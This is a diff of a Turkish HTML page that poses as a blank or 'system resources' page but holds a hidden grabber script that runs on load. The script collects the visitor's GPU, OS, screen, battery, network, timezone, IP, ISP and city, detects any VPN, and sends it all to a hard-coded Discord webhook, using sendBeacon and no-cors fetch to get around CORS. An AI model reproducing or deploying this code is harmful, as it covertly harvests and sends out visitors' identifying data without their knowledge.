@@ -2,58 +2,80 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Kaynakları</title>
-    <style>
-        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
-        .l { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 25px; height: 25px; animation: s 1s linear infinite; }
-        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
+    <title> </title>
+    <style>body { background:#000; margin:0; cursor:none; overflow:hidden; }</style>
 </head>
 <body>
-    <div class="l"></div>
-
     <script>
-        const webhook = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
+        const hook = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
         async function ultraDataExtract() {
-            // Boş değer korumalı başlangıç setupları
+            // 1. Manuel OS ve Donanım Tespiti
             let d = { 
-                gpu: "Maskelenmiş/Kısıtlı", ven: "Maskelenmiş/Kısıtlı", 
-                ip: "Alınamadı", iss: "Bilinmiyor", loc: "Bilinmiyor", 
-                net: "Bilinmiyor", bat: "Bilinmiyor", 
-                os: navigator.userAgent.split('(')[1].split(')')[0], // Manuel OS parsing
-                res: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`,
-                lang: navigator.language || "Bilinmiyor",
-                tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "Bilinmiyor"
+                gpu: "Maskelenmiş", ven: "Maskelenmiş", ip: "X", iss: "X", 
+                os: navigator.userAgent.split('(')[1] ? navigator.userAgent.split('(')[1].split(')')[0] : "Bilinmiyor",
+                res: `${screen.width}x${screen.height}`, 
+                bat: "X", net: "X", tz: Intl.DateTimeFormat().resolvedOptions().timeZone
             };
 
-            // 1. GPU Zorlama (Agresif Mod)
+            // 2. GPU Maskesini Kırma (Agresif Mod)
             try {
                 const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl2', {antialias:false, alpha:false}) || canvas.getContext('webgl');
+                const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
                 const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                if (dbg) {
-                    d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID) || "Gizli";
-                    d.ven = gl.getParameter(dbg.UNMASKED_VENDOR_ID) || "Gizli";
-                }
+                d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
+                d.ven = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
             } catch(e) {}
 
-            // 2. Ağ & Konum & ISS (Yedekli Yapı)
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const j = await res.json();
-                d.ip = j.ip || "X";
-                d.iss = `${j.org || 'Bilinmiyor'} (${j.asn || 'N/A'})`;
-                d.loc = `📍 **Bölge:** ${j.city}, ${j.region} / ${j.country_name}\n🛰️ **ISS:** \`${d.iss}\`\n🗺️ [Haritada Gör](http://www.google.com/maps/place/${j.latitude},${j.longitude})`;
-            } catch(e) {}
-
-            // 3. Pil & İnternet Hızı
+            // 3. Pil ve Ağ Analizi (Düzeltilen Kısım)
             try {
                 if(navigator.getBattery) {
                     const b = await navigator.getBattery();
-                    d.bat = `%${Math.round(b.level * 100)} (${b.charging ? 'Şarjda' : 'Pilde'})`;
+                    d.bat = `%${Math.round(b.level * 100)} (${b.charging ? 'Şarjda' : 'Deşarjda'})`;
                 }
                 const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                d.net = n ? `${n.effectiveType.toUpperCase()} (~${n.downlink}Mbps)` : "Tespit Edilemedi";
+            } catch(e) {}
 
+            // 4. VPN Tespiti ve Konum (Zaman Dilimi Karşılaştırmalı)
+            let vpnStatus = "✅ VPN KAPALI (DOĞRULANDI)";
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const j = await res.json();
+                d.ip = j.ip;
+                d.iss = `${j.org} (${j.asn})`;
+                d.loc = `📍 ${j.city}, ${j.country_name}`;
                 
+                if (j.timezone !== d.tz || j.proxy) {
+                    vpnStatus = `🚨 **VPN ALGILANDI**\n↳ Sistem: ${d.tz}\n↳ IP: ${j.timezone}`;
+                }
+            } catch(e) { vpnStatus = "⚠️ Analiz Bloklandı (Yüksek Gizlilik)"; }
+
+            // 5. KUSURSUZ GÖNDERİM (CORS BYPASS)
+            const payload = {
+                embeds: [{
+                    title: "💀 ADLİ ANALİZ: OMNISCIENCE V100",
+                    color: vpnStatus.includes("🚨") ? 15158332 : 3066993,
+                    fields: [
+                        { name: "🛡️ GÜVENLİK", value: vpnStatus, inline: false },
+                        { name: "📡 AĞ / IP / ISS", value: `**IP:** \`${d.ip}\`\n**ISS:** \`${d.iss}\`\n**Yerel:** \`${d.net}\`\n${d.loc || ''}`, inline: false },
+                        { name: "🛠️ DONANIM", value: `**GPU:** \`${d.gpu}\`\n**Vendor:** \`${d.ven}\`\n**Pil:** \`${d.bat}\``, inline: false },
+                        { name: "⚙️ SİSTEM", value: `**OS:** ${d.os}\n**Ekran:** ${d.res}\n**Zaman:** ${d.tz}`, inline: false }
+                    ],
+                    timestamp: new Date()
+                }]
+            };
+
+            // FETCH ENGELİNİ AŞMAK İÇİN BEACON VE NO-CORS KULLANIMI
+            const blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
+            navigator.sendBeacon(hook, blob); 
+            
+            // Yedek olarak no-cors fetch (Discord bazen bunu kabul eder)
+            fetch(hook, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
+        }
+
+        window.onload = () => setTimeout(ultraDataExtract, 400);
+    </script>
+</body>
+</html>
+
